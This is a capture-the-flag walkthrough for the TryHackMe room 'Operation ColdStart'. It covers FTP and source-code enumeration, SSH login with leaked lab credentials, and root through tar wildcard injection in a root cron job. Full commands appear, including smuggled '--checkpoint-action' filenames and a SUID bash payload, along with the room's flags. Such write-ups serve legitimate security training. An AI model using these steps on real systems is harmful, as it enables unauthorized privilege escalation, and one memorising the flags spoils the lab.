# Operation ColdStart - TryHackMe Walkthrough

## Machine Information

| Category         | Value                      |
| ---------------- | -------------------------- |
| Platform         | TryHackMe                  |
| Room Name        | Operation ColdStart        |
| Difficulty       | Easy                       |
| Operating System | Linux                      |
| Objective        | Obtain User and Root Flags |

---

# Scenario

Operation ColdStart is an easy Linux-based machine where our objective is to compromise the target, gain user access, and ultimately escalate privileges to root.

Target IP:

```text
10.48.137.97
```

---

# Reconnaissance

## Initial Nmap Scan

As always, we begin with a full TCP port scan.

```bash
nmap -p- --min-rate 5000 -T4 10.48.137.97
```

### Results

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Interesting.

The target exposes:

* FTP
* SSH
* HTTP

---

## Service Enumeration

Perform version detection.

```bash
nmap -sCV -p21,22,80 10.48.137.97
```

### Results

```text
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    gunicorn
```

Additional findings:

```text
Anonymous FTP Login Allowed
```

and

```text
URL Preview - Volt Labs
```

The web application appears to be running behind Gunicorn.

---

# FTP Enumeration

Since anonymous FTP access is enabled, this becomes the first attack surface.

Connect:

```bash
ftp anonymous@10.48.137.97
```

Browsing the FTP server reveals:

```text
pub
```

Inside the directory is a backup archive.

```text
backup.tar.gz
```

Download the archive and extract it.

```bash
tar -xvf backup.tar.gz
```

Extracted contents:

```text
README.md
app.py
requirements.txt
```

This is a major discovery because we now possess the application's source code.

---

# Source Code Review

Reviewing:

```text
app.py
```

reveals important logic.

One particularly interesting configuration:

```python
ALLOWED_HOSTS = {"kestrel.thm"}
```

This suggests the application internally trusts requests directed toward:

```text
kestrel.thm
```

Further code review reveals references to internal resources.

One notable endpoint:

```text
/admin/notes
```

---

# Accessing Internal Notes

Using the discovered host information, the internal notes page becomes accessible.

Visiting:

```text
http://kestrel.thm/admin/notes
```

returns:

```text
=== INTERNAL ===

SSH access for staging:

user: webdev
pass: V0ltLabs#summer

- Mara
```

Critical credentials have been exposed.

---

# Initial Access

Attempt SSH authentication using the recovered credentials.

```bash
ssh webdev@10.48.137.97
```

Password:

```text
V0ltLabs#summer
```

Authentication succeeds.

Verify access:

```bash
whoami
```

Output:

```text
webdev
```

Initial foothold obtained.

---

# User Flag

Read the user flag.

```bash
cat user.txt
```

Output:

```text
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

User access achieved.

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
Sorry, user webdev may not run sudo on coldstart.
```

No direct sudo privileges are available.

We must continue local enumeration.

---

# Cron Job Discovery

Investigating scheduled tasks reveals:

```bash
cat /etc/cron.d/voltlabs-backup
```

Contents:

```text
# Volt Labs staging backup - runs as root

SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

This is extremely interesting.

A root-owned cron job executes:

```text
tar czf /var/backups/uploads.tgz *
```

every minute.

The use of:

```text
*
```

creates a classic wildcard injection opportunity.

---

# Wildcard Injection

Tar is vulnerable to command-line argument injection when wildcard expansion is abused.

Reference:

```text
HackTricks - Tar Wildcard Privilege Escalation
```

Move into the backup directory.

```bash
cd /opt/backups
```

Create a payload.

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
```

Create malicious filenames:

```bash
touch -- '--checkpoint=1'
```

```bash
touch -- '--checkpoint-action=exec=sh shell.sh'
```

These files will be interpreted as tar arguments when the cron job executes.

---

# Waiting for Cron Execution

After approximately one minute, the root cron job processes the directory.

The injected arguments cause:

```bash
shell.sh
```

to execute as root.

This creates:

```text
/tmp/bash
```

with the SUID bit set.

Verify:

```bash
ls -l /tmp/bash
```

The binary is now owned by root and executable with elevated privileges.

---

# Root Access

Execute:

```bash
/tmp/bash -p
```

The `-p` flag preserves privileges.

Verify:

```bash
whoami
```

Output:

```text
root
```

Root shell obtained.

---

# Root Flag

Navigate to root's directory.

```bash
cd /root
```

Contents:

```text
flag.txt
```

Read the flag.

```bash
cat flag.txt
```

Output:

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

Root compromise complete.

---

# Flags

## User

```text
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

## Root

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

# Attack Path Summary

```text
Nmap Scan
      │
      ▼
Anonymous FTP Access
      │
      ▼
Download backup.tar.gz
      │
      ▼
Source Code Review
      │
      ▼
Discover kestrel.thm
      │
      ▼
Internal Notes Access
      │
      ▼
Recover SSH Credentials
      │
      ▼
SSH as webdev
      │
      ▼
User Flag
      │
      ▼
Cron Job Enumeration
      │
      ▼
Root Tar Backup Job
      │
      ▼
Wildcard Injection
      │
      ▼
Create SUID Bash
      │
      ▼
Execute /tmp/bash -p
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Key Takeaways

* Anonymous FTP access can expose highly sensitive application backups.
* Source code review often reveals hidden hosts, endpoints, and credentials.
* Internal notes and developer artifacts frequently leak operational secrets.
* Cron jobs running as root should always be reviewed during privilege escalation.
* Wildcard expansion vulnerabilities remain a common Linux privilege escalation vector.
* Tar argument injection is a classic example of insecure automation practices.
* SUID binaries can be leveraged to maintain elevated privileges after exploitation.

Machine rooted successfully.
